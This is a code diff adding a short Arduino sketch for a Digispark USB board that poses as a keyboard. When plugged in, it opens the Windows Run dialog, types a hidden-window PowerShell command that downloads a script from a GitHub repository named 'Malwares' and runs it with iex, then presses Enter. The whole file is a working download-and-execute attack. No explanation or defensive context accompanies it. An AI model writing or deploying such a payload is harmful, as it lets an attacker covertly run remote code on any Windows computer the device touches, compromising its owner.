@@ -1,0 +1,14 @@
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("PowerShell.exe -windowstyle hidden iex(new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/loseys/Malwares/master/PowerShell/teste');");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for (;;) {
+  }
+}
